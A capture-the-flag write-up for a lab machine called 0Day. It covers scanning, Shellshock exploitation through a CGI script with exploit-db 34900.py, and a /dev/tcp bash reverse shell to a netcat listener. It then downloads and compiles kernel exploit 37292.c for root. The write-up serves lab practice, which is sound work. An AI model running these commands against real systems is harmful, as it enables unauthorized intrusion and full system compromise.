# Welcome to my 0Day Writeup

## Reconnaissance and Enumeration

### Nmap Scan

`nmap -p- --open -sS --min-rate 5000 -n -Pn <IP>`
![[assets/Captura de pantalla de 2025-10-01 17-51-14.png]]

`nmap -p22,80 -sCV <IP> -oN targeted`
![[assets/Captura de pantalla de 2025-10-01 17-53-45.png]]

### FFUF Scan

Let's run a simple **ffuf** scan to look for hidden directories.

`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP>/FUZZ`
![[assets/Captura de pantalla de 2025-10-01 17-57-07.png]]
![[assets/Captura de pantalla de 2025-10-01 17-58-24.png]]

We don't have access to **cgi-bin**...

### Nikto Scan

Let's try a quick **Nikto** scan.

`nikto -h <IP>`

Nikto tells us that **/cgi-bin/test.cgi** is vulnerable to **Shellshock**. Interesting.

![[assets/Captura de pantalla de 2025-10-01 18-02-55.png]]

## Gaining Access

### Searchsploit

Using `searchsploit`, let's look for Shellshock-related exploits.

`searchsploit shellshock`
![[assets/Captura de pantalla de 2025-10-01 18-05-29.png]]

There are many scripts, but since Nikto shows the vulnerability is on **Apache**, we’ll use the Apache Remote Code Injection exploit.

![[assets/Captura de pantalla de 2025-10-01 18-07-16.png]]

Let's use this exploit:
![[assets/Captura de pantalla de 2025-10-01 18-08-03.png]]

Copy the script like this:

`searchsploit -m linux/remote/34900.py`

![[assets/Captura de pantalla de 2025-10-01 18-08-54.png]]

After analyzing the script, we need to run it like this:

`python2.7 34900.py payload=reverse rhost=<victim IP> lhost=<your IP> lport=443`

![[assets/Captura de pantalla de 2025-10-01 18-13-07.png]]

To get a more stable shell, we’ll upgrade it with **netcat**.

### Netcat

Start a listener:

`nc -nvlp 4444`

On the shell we got, run:

`bash -i &> /dev/tcp/<IP>/4444 0>&1`

![[assets/Captura de pantalla de 2025-10-01 18-16-34.png]]

Now the netcat listener receives the shell:
![[assets/Captura de pantalla de 2025-10-01 18-18-33.png]]

### User Flag

Inside `/home/ryan` we can read the user flag.
![[assets/Captura de pantalla de 2025-10-01 18-19-52.png]]

## Privilege Escalation

Inside `/tmp` we have full permissions, which is great because we can download any exploit we need.

![[assets/Captura de pantalla de 2025-10-01 18-21-06.png]]

Run `uname -a` to check the kernel version.
![[assets/Captura de pantalla de 2025-10-01 18-24-06.png]]

Look it up in exploit‑db and you'll find a matching privilege escalation exploit.
![[assets/Captura de pantalla de 2025-10-01 18-24-56.png]]

Download it.

Start a Python web server:

`python3 -m http.server 80`

![[assets/Captura de pantalla de 2025-10-01 18-26-15.png]]

On the victim machine, download the exploit via wget.
![[assets/Captura de pantalla de 2025-10-01 18-27-29.png]]

Compile it:

`gcc 37292.c -o exploit`

![[assets/Captura de pantalla de 2025-10-01 18-30-38.png]]

It fails—probably because `/usr/bin` isn’t in PATH.

Check if gcc exists:

`which gcc`
![[assets/Captura de pantalla de 2025-10-01 18-32-15.png]]

Yes. So let's fix the PATH.

`export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:$PATH`

![[assets/Captura de pantalla de 2025-10-01 18-34-00.png]]

Try compiling again:
![[assets/Captura de pantalla de 2025-10-01 18-36-04.png]]

It works. Now run the exploit:

`./exploit`

![[assets/Captura de pantalla de 2025-10-01 18-36-55.png]]

We are root.

### Root Flag

Just run:

`cat /root/root*`
![[assets/Captura de pantalla de 2025-10-01 18-37-44.png]]

`Thanks for reading! Hope you enjoyed it.`

